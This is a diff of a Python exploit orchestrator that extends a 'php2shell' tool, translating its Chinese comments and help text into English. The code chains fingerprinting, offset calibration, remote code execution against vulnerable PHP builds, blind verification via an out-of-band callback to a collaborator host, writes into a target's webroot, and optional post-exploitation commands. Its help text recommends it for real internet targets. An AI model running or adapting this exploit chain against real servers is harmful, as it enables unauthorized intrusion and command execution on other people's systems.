 #             "dtor_offset":"0x4807D0", "stage2_t":406, "rce_ok":false, "label":"..."}}
 _PROFILE_STORES = [
@@ -731,7 +731,7 @@ _PROFILE_STORES = [
 
 
 def _coerce_profile(prof):
-    """把 JSON 里的字符串十六进制转成 int，保持与内置 profile 同构。"""
+    """Convert string hex values in the JSON to int, keeping the same shape as the built-in profiles."""
     out = dict(prof)
     for k in ("htdata_offset", "zif_offset", "dtor_offset"):
         v = out.get(k)
@@ -755,7 +755,7 @@ def _coerce_profile(prof):
 
 
 def import_profile_store(verbose=False):
-    """把外部 profiles.json 合入 PROFILE_DB；同名版本以内置为准（不覆盖）。"""
+    """Merge the external profiles.json into PROFILE_DB; built-in versions win (never overwritten)."""
     added = 0
     for path in _PROFILE_STORES:
         try:
@@ -765,7 +765,7 @@ def import_profile_store(verbose=False):
                 data = json.load(fh)
             if not isinstance(data, dict):
                 if verbose:
-                    print(f"[!] profiles.json 顶层不是对象：{path}")
+                    print(f"[!] profiles.json top level is not an object: {path}")
                 continue
             for ver, prof in data.items():
                 ver = str(ver).strip()
@@ -773,20 +773,20 @@ def import_profile_store(verbose=False):
                     continue
                 if ver in PROFILE_DB:
                     if verbose:
-                        print(f"[*] profiles.json: {ver} 已内置，跳过（{path}）")
+                        print(f"[*] profiles.json: {ver} is built in, skipping ({path})")
                     continue
                 p = _coerce_profile(prof)
                 p.setdefault("label", "profiles.json:%s" % ver)
                 PROFILE_DB[ver] = p
                 added += 1
                 if verbose:
-                    print(f"[+] profiles.json: 载入 profile {ver}（{path}）")
+                    print(f"[+] profiles.json: loaded profile {ver} ({path})")
         except Exception as e:
             if verbose:
-                print(f"[!] profiles.json 读取失败 {path}: {e}")
+                print(f"[!] failed to read profiles.json {path}: {e}")
             continue
     if verbose and added:
-        print(f"[*] profiles.json 共新增 {added} 个 profile")
+        print(f"[*] profiles.json added {added} profiles in total")
     return added
 
 
@@ -799,7 +799,7 @@ FIXED = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}
 
 
 def _is_patched(ver):
-    """按官方修复版本矩阵判断是否已修复。"""
+    """Decide whether it is already patched using the official fixed-version matrix."""
     k = _ver_key(ver)
     if not k:
         return False
@@ -809,7 +809,7 @@ def _is_patched(ver):
 
 
 def _http_get(url, timeout=20, headers=None):
-    """极简 GET（真实目标回读用，无第三方依赖）。失败返 None。"""
+    """Minimal GET (used for readback from real targets, no third-party deps). Returns None on failure."""
     try:
         import urllib.request
         req = urllib.request.Request(url, headers=headers or {
@@ -823,7 +823,7 @@ def _http_get(url, timeout=20, headers=None):
 
 
 def _run(cmd, timeout=1800):
-    """跑子进程，返回 (rc, out+err)。"""
+    """Run a subprocess, return (rc, out+err)."""
     try:
         r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
         return r.returncode, (r.stdout or "") + (r.stderr or "")
@@ -842,7 +842,7 @@ def _load_json(p):
 
 
 def _pick_profile(scan, a):
-    """profile 选择优先级：--profile > PROFILE_DB(按版本) > CLI 显式覆盖。"""
+    """Profile priority: --profile > PROFILE_DB (by version) > explicit CLI overrides."""
     prof = dict(BASE_PROFILE)
     src = "base"
     if getattr(a, "profile", None):
@@ -872,7 +872,7 @@ def _pick_profile(scan, a):
 
 
 def oneclick_stop_exit(rc, verdict):
-    """scan 已给出“不该继续”的结论时，返回要透传的 exit；否则 None。"""
+    """When scan already returned a "do not continue" verdict, return the exit code to propagate; otherwise None."""
     if rc in (20, 30, 40, 50):
         return rc
     v = (verdict or "").upper()
@@ -888,7 +888,7 @@ def oneclick_stop_exit(rc, verdict):
 
 
 def do_oneclick(a):
-    """一条命令：指纹 → 前置判定 → 标定(可选) → 利用/盲验证 → 后渗透(可选) → 报告。"""
+    """One command: fingerprint -> precondition check -> calibrate (optional) -> exploit/blind verify -> post-exploitation (optional) -> report."""
     url = a.url.rstrip("/") + "/"
 
     outdir = a.outdir or os.path.join(".", "oneclick_%s" % re.sub(r"\W+", "_", url)[:40])
@@ -899,8 +899,8 @@ def do_oneclick(a):
     def log(msg):
         print(msg, flush=True)
 
-    # ---------- 1. 只读指纹 + 前置判定（复用 php2shell.py scan，json 落盘）
-    log("[1/5] 指纹 + 前置判定 …")
+    # ---------- 1. read-only fingerprint + precondition check (reuses php2shell.py scan, writes json)
+    log("[1/5] fingerprint + precondition check ...")
     scan_json = os.path.join(outdir, "scan.json")
     cmd = [sys.executable, TOOL, "scan", "-u", url, "--json", "-o", scan_json,
            "--timeout", "%.1f" % a.timeout]
@@ -923,11 +923,11 @@ def do_oneclick(a):
     rep["steps"].append({"step": "scan", "rc": rc1, "verdict": ver,
                          "php_version": rep["php_version"], "server": rep["server"]})
     log("      PHP=%s  Server=%s" % (rep["php_version"], rep["server"]))
-    log("      前置=%s  sink=%s" % (rep["precondition"], rep["sink"]))
-    log("      判定=%s (rc=%d)" % (ver, rc1))
+    log("      precondition=%s  sink=%s" % (rep["precondition"], rep["sink"]))
+    log("      verdict=%s (rc=%d)" % (ver, rc1))
     rep["verdict"] = ver
 
-    # scan 的 exit 已经给出了“不该继续”的强结论：不要再花一轮 exploit 去撞超时
+    # scan's exit code already gives a hard "do not continue": do not burn another exploit round into a timeout
     #   20=AFFECTED_DOS_ONLY / 30=NOT_AFFECTED_OR_PATCHED / 40=NO_SESSION_SINK / 50=UNREACHABLE
     stop = oneclick_stop_exit(rc1, ver)
     if stop is not None:
@@ -935,26 +935,26 @@ def do_oneclick(a):
         _oneclick_finish(rep, outdir)
         return stop
 
-    # 版本已在官方修复矩阵之外 → 直接判 SAFE，不做任何 OOM 探测
+    # Version is already outside the official fixed matrix -> report SAFE directly, run no OOM probe
     if _is_patched(rep["php_version"]):
         rep["verdict"] = "PATCHED_BY_VERSION(%s)" % ver
         rep["exit"] = 30
-        log("      版本 %s 已高于修复阈值 → PATCHED，停止探测" % rep["php_version"])
+        log("      version %s is at or above the fixed threshold -> PATCHED, stopping probes" % rep["php_version"])
         _oneclick_finish(rep, outdir)
         return 30
 
-    # 仅 DoS / 仅前置：不进攻击阶段
+    # DoS only / preconditions only: do not enter the attack phase
     if "DOS_ONLY" in ver or "DOS-ONLY" in ver:
         rep["exit"] = 20
         _oneclick_finish(rep, outdir)
         return 20
     if "PREMISES_ONLY" in ver and not getattr(a, "force", False):
         rep["exit"] = 15
-        log("      仅前置条件满足（未验证 OOM）：加 --force 可强制进入攻击阶段")
+        log("      only the preconditions are met (OOM not verified): add --force to enter the attack phase anyway")
         _oneclick_finish(rep, outdir)
         return 15
 
-    # ---------- 2. profile 选择
+    # ---------- 2. profile selection
     prof = _pick_profile(rep, a)
     rep["profile"] = {k: (hex(v) if isinstance(v, int) and k.endswith("offset") else v)
                       for k, v in prof.items() if not k.startswith("_")}
@@ -962,37 +962,37 @@ def do_oneclick(a):
     rep["cap"] = cmd_cap(prof)
     log("[2/5] profile=%s  cap=%dB" % (rep["profile_source"], rep["cap"]))
     if prof.get("_needs_cal") and not a.force:
-        log("      [!] 该 profile 只有 symbols 偏移；ht_size/htdata_offset 仍是 base 值。")
-        log("          先在同构建环境跑 calibrate，或显式 --force（不推荐，等于盲打）。")
+        log("      [!] this profile only has symbols offsets; ht_size/htdata_offset are still base values.")
+        log("          run calibrate in an environment with the same build first, or pass --force explicitly (not recommended, that is blind hitting).")
         rep["verdict"] = "NEEDS_CALIBRATION"
         rep["exit"] = 15
         _oneclick_finish(rep, outdir)
         return 15
     if prof.get("_db_rce_ok") is False and not (a.profile or a.zif_offset or a.dtor_offset):
-        log("      [!] 该构建已知无 infoleak 原语：%s" % prof.get("_db_label", ""))
+        log("      [!] this build is known to lack an infoleak primitive: %s" % prof.get("_db_label", ""))
         rep["verdict"] = "AFFECTED_DOS_ONLY"
         rep["exit"] = 20
         _oneclick_finish(rep, outdir)
         return 20
 
-    # ---------- 3. 攻击：有 collab 走盲验证；有写目录走 proof-dir；都没有则先标定
+    # ---------- 3. attack: with collab use blind verification; with a writable dir use proof-dir; otherwise calibrate first
     attack_mode = None
     if a.collab:
-        attack_mode = "blind"                      # 带外回调：真实目标首选，无需目标可写
+        attack_mode = "blind"                      # out-of-band callback: first choice on real targets, no writable target needed
     elif getattr(a, "http_read", None):
-        attack_mode = "httpread"                   # 相对写入 webroot + HTTP 回读：无需挂载/无需出网
+        attack_mode = "httpread"                   # relative write into webroot + HTTP readback: no mount and no egress needed
     elif a.dir and a.local_dir:
-        attack_mode = "writeback"                  # 本地可回读目录（靶场/容器挂载）
+        attack_mode = "writeback"                  # locally readable directory (lab/container mount)
     if attack_mode is None:
-        log("[3/5] 缺少取证通道：给 --collab HOST:PORT（带外回调，最通用）"
-            " / --http-read https://t/（目标 webroot 可写） / --dir+--local-dir（本地可回读）")
+        log("[3/5] no evidence channel: pass --collab HOST:PORT (out-of-band callback, most universal)"
+            " / --http-read https://t/ (target webroot writable) / --dir+--local-dir (locally readable)")
         rep["steps"].append({"step": "attack", "skipped": "no-oracle"})
         rep["exit"] = 10
         _oneclick_finish(rep, outdir)
         return 10
 
     if (a.calibrate or getattr(a, "auto_cal", False)) and a.collab:
-        log("[3/5] 回调 oracle 标定 htdata_offset …")
+        log("[3/5] calibrating htdata_offset with the callback oracle ...")
         cmd = [sys.executable, os.path.abspath(__file__), "calibrate", "-u", url,
                "--ht-size", str(prof["ht_size"]), "--collab", a.collab,
                "--rounds", str(a.rounds), "--pause", str(a.pause),
@@ -1009,7 +1009,7 @@ def do_oneclick(a):
             prof.update({k: v for k, v in cal.items() if v is not None})
             rep["calibrated"] = True
 
-    log("[4/5] 攻击（%s）…" % attack_mode)
+    log("[4/5] attack (%s) ..." % attack_mode)
     if attack_mode == "blind":
         cmd = [sys.executable, os.path.abspath(__file__), "blind", "-u", url,
                "--collab", a.collab, "--token", a.token,
@@ -1026,7 +1026,7 @@ def do_oneclick(a):
         with io.open(rep["artifacts"]["blind_log"], "w", encoding="utf-8") as f:
             f.write(outa)
         for ln in outa.splitlines():
-            if "回调" in ln or "rc=" in ln:
+            if "callback" in ln or "rc=" in ln:
                 log("      " + ln.strip())
     elif attack_mode == "httpread":
         base = a.http_read.rstrip("/")
@@ -1037,11 +1037,11 @@ def do_oneclick(a):
         proof_cmd = a.cmd or ("id>" + _nm)
         if len(proof_cmd.encode()) > _cap:
             proof_cmd = "id>" + _nm
-            log("      [!] 自定义命令超 cap，回退：%s" % proof_cmd)
+            log("      [!] custom command exceeds cap, falling back to: %s" % proof_cmd)
         read_url = "%s/%s" % (base, _nm)
         rep["proof_cmd"] = proof_cmd
         rep["proof_url"] = read_url
-        log("      取证命令：%s (%dB / cap %dB) → %s"
+        log("      proof command: %s (%dB / cap %dB) -> %s"
             % (proof_cmd, len(proof_cmd.encode()), _cap, read_url))
         cmd = [sys.executable, os.path.join(os.path.dirname(os.path.abspath(__file__)), "php2shell.py"), "exploit", "-u", url,
                "-c", proof_cmd,
@@ -1067,20 +1067,20 @@ def do_oneclick(a):
             expect is None or re.search(expect, body) is not None)
         rep["rce"] = ok
         rep["proof_body"] = (body or "")[:200]
-        log("      HTTP 回读 %s → %s" % (read_url, "命中" if ok else "未命中"))
+        log("      HTTP readback %s -> %s" % (read_url, "hit" if ok else "miss"))
         if not ok:
-            log("      [!] 可能原因：webroot 不可写 / cwd 非 webroot / 回读路径被拦截")
+            log("      [!] possible causes: webroot not writable / cwd is not the webroot / readback path blocked")
     else:
         _cap = cmd_cap(prof)
         _nm = "o%03d" % (int(time.time()) % 1000)
         proof_cmd = a.cmd or ("id>%s/%s" % (a.dir.rstrip("/"), _nm))
         if len(proof_cmd.encode()) > _cap:
             _min = "id>%s/o" % a.dir.rstrip("/")
-            log("      [!] 自定义命令 %dB 超过 cap=%dB，回退最小取证命令：%s"
+            log("      [!] custom command %dB exceeds cap=%dB, falling back to the minimal proof command: %s"
                 % (len(proof_cmd.encode()), _cap, _min))
             proof_cmd = _min
         rep["proof_cmd"] = proof_cmd
-        log("      取证命令：%s (%dB / cap %dB)" % (proof_cmd, len(proof_cmd.encode()), _cap))
+        log("      proof command: %s (%dB / cap %dB)" % (proof_cmd, len(proof_cmd.encode()), _cap))
         cmd = [sys.executable, TOOL, "exploit", "-u", url, "-c", proof_cmd,
                "--zif-offset", hex(prof["zif_offset"]),
                "--dtor-offset", hex(prof["dtor_offset"]),
@@ -1093,7 +1093,7 @@ def do_oneclick(a):
             cmd += ["--stage1-n", str(prof["stage1_n"])]
         rca, outa = _run(cmd, timeout=3600)
         rep["steps"].append({"step": "exploit", "rc": rca, "cmd": proof_cmd})
-        # rc=0 只代表「本次运行新写了一个 proof 文件」；再核对本地回读内容
+        # rc=0 only means "this run wrote a new proof file"; verify the local readback content as well
         _out = proof_cmd.rsplit(">", 1)[-1].strip()
         _pf = os.path.join(a.local_dir, os.path.basename(_out))
         _content = b""
@@ -1115,9 +1115,9 @@ def do_oneclick(a):
     rep["scan_verdict"] = rep["verdict"]
     rep["verdict"] = "RCE_CONFIRMED" if rep["rce"] else "LIKELY_RCE_NOT_VERIFIED"
 
-    # ---------- 5. 可选后渗透
+    # ---------- 5. optional post-exploitation
     if rep["rce"] and a.postex:
-        log("[5/5] 后渗透取证 …")
+        log("[5/5] post-exploitation forensics ...")
         cmd = [sys.executable, os.path.abspath(__file__), "postex", "-u", url,
                "--ht-size", str(prof["ht_size"]),
                "--htdata-offset", hex(prof["htdata_offset"]),
@@ -1138,7 +1138,7 @@ def do_oneclick(a):
         rep["artifacts"]["postex_dir"] = os.path.join(outdir, "postex")
         log("      postex rc=%d" % rcp)
     else:
-        log("[5/5] 后渗透：跳过（%s）" % ("未拿到 RCE" if not rep["rce"] else "未加 --postex"))
+        log("[5/5] post-exploitation: skipped (%s)" % ("no RCE obtained" if not rep["rce"] else "--postex not given"))
 
     rep["exit"] = 0 if rep["rce"] else 10
     _oneclick_finish(rep, outdir)
@@ -1150,7 +1150,7 @@ def _oneclick_finish(rep, outdir):
     path = os.path.join(outdir, "oneclick_report.json")
     with io.open(path, "w", encoding="utf-8") as f:
         json.dump(rep, f, ensure_ascii=False, indent=1)
-    print("--- oneclick 结论 ---")
+    print("--- oneclick verdict ---")
     print("target      : %s" % rep["target"])
     print("php_version : %s" % rep.get("php_version"))
     print("verdict     : %s" % rep.get("verdict"))
@@ -1160,7 +1160,7 @@ def _oneclick_finish(rep, outdir):
 
 
 def do_recon(a):
-    """委派给 attack/recon.py（真实站点侦察：版本/消费点/落点/偏移四前置分级）。"""
+    """Delegate to attack/recon.py (real-site recon: grading of the four preconditions version/sink/landing point/offset)."""
     sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
     import recon
     argv = ["-u", a.url]
@@ -1188,16 +1188,16 @@ def main():
         import_profile_store(verbose=True)
     except Exception:
         pass
-    ap = argparse.ArgumentParser(description="php2shell 扩展：符号推导 + 跨版本标定 + 后渗透")
+    ap = argparse.ArgumentParser(description="php2shell extension: symbol derivation + cross-version calibration + post-exploitation")
     sub = ap.add_subparsers(dest="cmd", required=True)
 
-    s = sub.add_parser("symbols", help="从 libphp.so 符号表推导 zif/dtor 偏移")
+    s = sub.add_parser("symbols", help="derive zif/dtor offsets from the libphp.so symbol table")
     s.add_argument("--elf")
-    s.add_argument("--docker", help="容器名[:容器内路径]")
+    s.add_argument("--docker", help="container name[:path inside the container]")
     s.add_argument("--out")
     s.set_defaults(func=do_symbols)
 
-    b = sub.add_parser("blind", help="盲验证：带外回调证明命令执行（真实公网无回读通道时使用）")
+    b = sub.add_parser("blind", help="blind verification: prove command execution via an out-of-band callback (for real internet targets with no readback channel)")
     b.add_argument("-u", "--url", required=True)
     b.add_argument("--profile")
     b.add_argument("--ht-size", type=int)
@@ -1205,8 +1205,8 @@ def main():
     b.add_argument("--dtor-offset", type=lambda x: int(x, 0))
     b.add_argument("--htdata-offset", type=lambda x: int(x, 0))
     b.add_argument("--stage2-t", type=int)
-    b.add_argument("--collab", required=True, help="协作端，形如 h:9000（需落在命令容量内）")
-    b.add_argument("--token", default="p1", help="回调路径 token（2 字符以内最省字节）")
+    b.add_argument("--collab", required=True, help="collaborator, e.g. h:9000 (must fit within the command capacity)")
+    b.add_argument("--token", default="p1", help="callback path token (2 characters or fewer saves the most bytes)")
     b.add_argument("--listen", action="store_true", default=True)
     b.add_argument("--no-listen", dest="listen", action="store_false")
     b.add_argument("--listen-port", type=int, default=9000)
@@ -1216,20 +1216,20 @@ def main():
     b.add_argument("--timeout", type=float, default=90)
     b.set_defaults(func=do_blind)
 
-    f = sub.add_parser("fingerprint", help="只读指纹：不触发 OOM 的版本/暴露面判定")
+    f = sub.add_parser("fingerprint", help="read-only fingerprinting: version/exposure check that does not trigger OOM")
     f.add_argument("-u", "--url", required=True)
     f.add_argument("--max-paths", type=int, default=5)
     f.add_argument("--timeout", type=float, default=10)
     f.set_defaults(func=do_fingerprint)
 
-    c = sub.add_parser("calibrate", help="标定 ht_size / htdata_offset / stage2_t")
+    c = sub.add_parser("calibrate", help="calibrate ht_size / htdata_offset / stage2_t")
     c.add_argument("-u", "--url", required=True)
     c.add_argument("--profile")
     c.add_argument("--ht-size", type=int)
     c.add_argument("--ht-size-lo", type=int, default=151)
     c.add_argument("--ht-size-hi", type=int, default=215)
     c.add_argument("--ht-size-step", type=int, default=8)
-    c.add_argument("--htdata-window", help="如 0x680000:0x700000")
+    c.add_argument("--htdata-window", help="e.g. 0x680000:0x700000")
     c.add_argument("--htdata-step", type=lambda x: int(x, 0), default=0x100)
     c.add_argument("--zif-offset", type=lambda x: int(x, 0))
     c.add_argument("--dtor-offset", type=lambda x: int(x, 0))
@@ -1238,15 +1238,15 @@ def main():
     c.add_argument("--stage2-t", type=int)
     c.add_argument("--rounds", type=int, default=8)
     c.add_argument("--tries", type=int, default=2)
-    c.add_argument("--pause", type=float, default=0.6, help="每次尝试后停顿秒数")
-    c.add_argument("--dir", help="绝对目录通道（如 /out），需配 --local-dir")
-    c.add_argument("--local-dir", dest="local_dir", help="与 --dir 对应的本机/宿主目录")
+    c.add_argument("--pause", type=float, default=0.6, help="seconds to pause after each attempt")
+    c.add_argument("--dir", help="absolute directory channel (e.g. /out), requires --local-dir")
+    c.add_argument("--local-dir", dest="local_dir", help="local/host directory corresponding to --dir")
     c.add_argument("--out")
-    c.add_argument("--collab", help="带外回调 oracle：collab 形如 h:9000（无需回读通道）")
+    c.add_argument("--collab", help="out-of-band callback oracle: collab looks like h:9000 (no readback channel needed)")
     c.add_argument("--listen-port", type=int, default=9000)
     c.set_defaults(func=do_calibrate)
 
-    p = sub.add_parser("postex", help="RCE 后攻击命令库（≤14B）")
+    p = sub.add_parser("postex", help="post-RCE attack command library (≤14B)")
     p.add_argument("-u", "--url", required=True)
     p.add_argument("--profile")
     p.add_argument("--ht-size", type=int)
@@ -1257,34 +1257,34 @@ def main():
     p.add_argument("--only")
     p.add_argument("--rounds", type=int, default=8)
     p.add_argument("--tries", type=int, default=3)
-    p.add_argument("--dir", help="绝对写目录通道（如 /out 或 /tmp），需配 --local-dir 回读")
-    p.add_argument("--local-dir", dest="local_dir", help="与 --dir 对应的本机/宿主目录")
+    p.add_argument("--dir", help="absolute writable directory channel (e.g. /out or /tmp), requires --local-dir for readback")
+    p.add_argument("--local-dir", dest="local_dir", help="local/host directory corresponding to --dir")
     p.add_argument("--pause", type=float, default=0.6)
     p.add_argument("--outdir")
     p.add_argument("--cleanup", action="store_true")
     p.set_defaults(func=do_postex)
 
 
-    p = sub.add_parser("oneclick", help="一条命令：指纹→前置→标定→利用/盲验证→后渗透→报告")
+    p = sub.add_parser("oneclick", help="one command: fingerprint->preconditions->calibrate->exploit/blind verify->post-exploitation->report")
     p.add_argument("-u", "--url", required=True)
-    p.add_argument("--collab", help="带外回调协作端 host:port（公网推荐，无需目标可写目录）")
-    p.add_argument("--token", default="p1", help="回调路径 token（默认 p1）")
-    p.add_argument("--listen", action="store_true", help="本机自动起回调监听")
+    p.add_argument("--collab", help="out-of-band callback collaborator host:port (recommended on the internet, no writable target directory needed)")
+    p.add_argument("--token", default="p1", help="callback path token (default p1)")
+    p.add_argument("--listen", action="store_true", help="automatically start the callback listener locally")
     p.add_argument("--listen-port", dest="listen_port", type=int, default=9000)
-    p.add_argument("--calibrate", action="store_true", help="先用回调 oracle 标定 htdata_offset")
+    p.add_argument("--calibrate", action="store_true", help="calibrate htdata_offset with the callback oracle first")
     p.add_argument("--http-read", dest="http_read", metavar="BASEURL",
-                   help="真实目标首选通道：相对写入 webroot 后用它回读，如 https://t/")
-    p.add_argument("--dir", help="目标绝对可写目录（如 /out），配 --local-dir 回读")
-    p.add_argument("--local-dir", dest="local_dir", help="与 --dir 对应的本机目录")
-    p.add_argument("--cmd", help="自定义取证命令（默认 id><--dir>/oneclick_<ts>）")
+                   help="preferred channel on real targets: write relatively into the webroot, then read back through this, e.g. https://t/")
+    p.add_argument("--dir", help="absolute writable directory on the target (e.g. /out), pair with --local-dir for readback")
+    p.add_argument("--local-dir", dest="local_dir", help="local directory corresponding to --dir")
+    p.add_argument("--cmd", help="custom proof command (default id><--dir>/oneclick_<ts>)")
     p.add_argument("--auto-calibrate", dest="auto_cal", action="store_true",
-                   help="未知构建时自动扫 htdata 窗口标定（会产生多次 OOM）")
+                   help="auto-sweep the htdata window to calibrate on unknown builds (causes several OOMs)")
     p.add_argument("--calib-window", dest="calib_window", default="0x68000:0x6C000")
     p.add_argument("--calib-step", dest="calib_step", default="0x100")
-    p.add_argument("--tries", type=int, default=3, help="postex 每条命令重试次数（默认 3）")
-    p.add_argument("--force", action="store_true", help="跳过 PREMISES_ONLY 早退，强制攻击（自行确认前置）")
-    p.add_argument("--postex", action="store_true", help="拿到 RCE 后自动跑后渗透取证")
-    p.add_argument("--only", help="postex 仅跑指定项（逗号分隔，如 id,env,ps）")
+    p.add_argument("--tries", type=int, default=3, help="retries per postex command (default 3)")
+    p.add_argument("--force", action="store_true", help="skip the PREMISES_ONLY early exit and attack anyway (confirm the preconditions yourself)")
+    p.add_argument("--postex", action="store_true", help="run post-exploitation forensics automatically after RCE")
+    p.add_argument("--only", help="run only the given postex items (comma separated, e.g. id,env,ps)")
     p.add_argument("--profile")
     p.add_argument("--ht-size", type=int)
     p.add_argument("--zif-offset", type=lambda x: int(x, 0))
@@ -1301,13 +1301,13 @@ def main():
     p.set_defaults(func=do_oneclick)
 
     p = sub.add_parser("recon",
-                       help="真实站点侦察：多版本取证+session消费点+落点+偏移匹配（默认只读）")
+                       help="real-site recon: multi-version evidence + session sink + landing point + offset matching (read-only by default)")
     p.add_argument("-u", "--url", required=True)
-    p.add_argument("--entries", default="", help="自定义入口列表（逗号分隔）")
+    p.add_argument("--entries", default="", help="custom entry list (comma separated)")
     p.add_argument("--deep", action="store_true",
-                   help="开启落点探测（递增体积 multipart；可能造成 5xx，需授权）")
+                   help="enable landing-point probing (growing-size multipart; may cause 5xx, requires authorization)")
     p.add_argument("--fast", action="store_true",
-                   help="快速模式：只查首页版本 + 最多 2 个 sink 入口（2–3 个请求），跳过大体积探测")
+                   help="fast mode: home page version only + at most 2 sink entries (2-3 requests), skip the large-body probing")
     p.add_argument("--probe-sizes", dest="probe_sizes", default="0.5,1,2,4,8,16")
     p.add_argument("--budget", type=int, default=6)
     p.add_argument("--delay", type=float, default=1.0)
@@ -1317,11 +1317,11 @@ def main():
     p.add_argument("-v", "--verbose", action="store_true")
     p.set_defaults(func=do_recon)
 
-    # 统一给所有子命令加 --insecure（https 自签/过期证书靶场需要）
+    # add --insecure to every subcommand uniformly (needed for https labs with self-signed/expired certificates)
     for _sp in sub.choices.values():
         if not any(a.dest == "insecure" for a in _sp._actions):
             _sp.add_argument("--insecure", action="store_true",
-                             help="https 目标跳过 TLS 证书校验（自签靶场）；默认严格校验")
+                             help="skip TLS certificate verification for https targets (self-signed labs); strict by default")
 
     a = ap.parse_args()
     if getattr(a, "insecure", False):
